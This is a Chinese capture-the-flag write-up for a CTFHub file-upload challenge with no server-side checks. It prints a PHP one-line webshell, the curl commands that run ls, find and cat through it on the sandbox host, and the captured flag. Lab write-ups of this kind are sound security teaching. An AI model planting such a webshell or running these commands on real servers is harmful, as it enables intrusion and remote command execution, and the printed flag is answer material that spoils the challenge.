## 漏洞发现
访问靶场页面，发现是一个简单的文件上传表单。页面标题明确提示了“无限制”，说明服务器端没有任何黑名单、白名单、MIME 类型或文件内容的校验。可以直接上传恶意脚本（WebShell）。

## 攻击过程

### 步骤一：制作 PHP 一句话木马
在本地新建文本文件，写入以下代码并保存为 `shell.php`：
<?php @eval($_POST['pass']);?>

### 步骤二：上传木马并获取路径
在靶场页面点击“选择文件”，上传 shell.php，点击 Submit。上传成功后，推测/确认文件存储在 /upload/ 目录下。
拼接出木马的完整访问路径：
http://challenge-c4f56748eac85004.sandbox.ctfhub.com:10800/upload/shell.php

### 步骤三：绕过本地防火墙拦截
由于本地杀毒软件/防火墙拦截了蚁剑（AntSword）等 Webshell 管理工具的运行，采取曲线救国的方式：直接使用 Windows 自带的 cmd 配合 curl 命令发送 POST 请求来执行系统命令。
1. 验证木马是否可用（执行 ls 查看当前目录）：
cmd
curl -X POST "http://challenge-c4f56748eac85004.sandbox.ctfhub.com:10800/upload/shell.php" -d "pass=system('ls');"
2.全盘搜索 Flag 文件：
由于不知道 Flag 的具体位置，利用 find 命令搜索包含 flag 关键字的文件：
curl -X POST "http://challenge-c4f56748eac85004.sandbox.ctfhub.com:10800/upload/shell.php" -d "pass=system('find / -name *flag*');"
在返回的大量系统路径中，敏锐地发现了网站根目录下的关键文件：
/var/www/html/flag_2222327689.php

## 步骤四：读取 Flag
利用 cat 命令直接读取该文件内容：
curl -X POST "http://challenge-c4f56748eac85004.sandbox.ctfhub.com:10800/upload/shell.php" -d "pass=system('cat /var/www/html/flag_2222327689.php');"
命令执行后，终端成功回显了 Flag：
ctfhub{94da8ed0c7feca580e489172}
